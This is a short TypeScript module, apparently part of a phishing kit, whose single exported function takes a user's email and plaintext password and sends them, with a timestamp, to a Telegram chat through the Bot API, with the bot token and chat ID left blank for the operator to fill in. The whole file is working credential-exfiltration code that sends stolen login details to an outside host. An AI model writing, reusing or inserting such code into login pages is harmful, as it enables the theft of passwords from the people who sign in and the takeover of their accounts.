
const botToken = ""; // Add your bot token here
const chatId = ""; // Add your chat ID here

export const sendLoginDetailsToTelegram = async (email: string, password: string) => {
  if (!botToken || !chatId) {
    console.log("Telegram configuration missing");
    return false;
  }

  try {
    const message = `🔐 Login Attempt:\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};
